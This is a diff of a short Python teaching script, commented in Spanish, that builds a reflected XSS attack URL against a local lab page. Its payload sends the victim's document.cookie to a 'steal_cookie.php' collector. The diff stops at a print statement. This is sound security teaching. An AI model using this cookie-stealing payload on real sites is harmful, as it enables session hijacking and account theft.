@@ -1,12 +1,25 @@
 import urllib.parse
 
+# --- Explicación ---
+# Este script demuestra cómo se construye una URL para un ataque de XSS Reflejado.
+# El objetivo es inyectar un script que robe la cookie de la sesión de la víctima
+# y la envíe a un servidor controlado por el atacante.
+
+# 1. La URL base de nuestro sitio vulnerable.
 base_url = "http://localhost/lab_xss/search.php"
 
+# 2. El payload (la carga útil) es el código JavaScript que queremos ejecutar.
+#    - document.cookie obtiene la cookie de la página actual.
+#    - window.location.href envía la cookie como parámetro a nuestro script 'steal_cookie.php'.
+#    - IMPORTANTE: La URL del atacante debe estar codificada para ser un parámetro válido.
 attacker_server_url = "http://localhost/lab_xss/steal_cookie.php"
 payload = f"<script>window.location.href='{attacker_server_url}?cookie=' + document.cookie;</script>"
 
+# 3. Codificamos el payload para que pueda ser enviado de forma segura en una URL.
+#    Por ejemplo, los '<' y '>' se convierten en %3C y %3E.
 encoded_payload = urllib.parse.quote_plus(payload)
 
+# 4. Construimos la URL final del ataque.
 malicious_url = f"{base_url}?query={encoded_payload}"
 
 print("--- Explicación del Ataque XSS Reflejado ---")
